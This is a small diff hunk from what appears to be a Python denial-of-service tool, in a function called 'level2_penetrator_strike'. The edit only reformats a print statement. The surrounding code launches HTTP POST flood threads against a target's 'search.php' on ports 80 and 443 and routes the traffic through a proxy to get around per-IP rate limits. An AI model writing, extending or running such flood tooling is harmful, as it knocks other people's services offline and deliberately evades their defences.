@@ -49,7 +49,8 @@ def level2_penetrator_strike(target, use_proxy, network_interface):
 
     # Heavy POST Flood to the vulnerable 'search.php' page (assuming it exists).
     # If using proxy, this bypasses per-IP rate limits.
-    if use_proxy: print("[PROXY] L7 attacks will be routed through the proxy.")
+    if use_proxy:
+        print("[PROXY] L7 attacks will be routed through the proxy.")
     for port in [80, 443]:
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
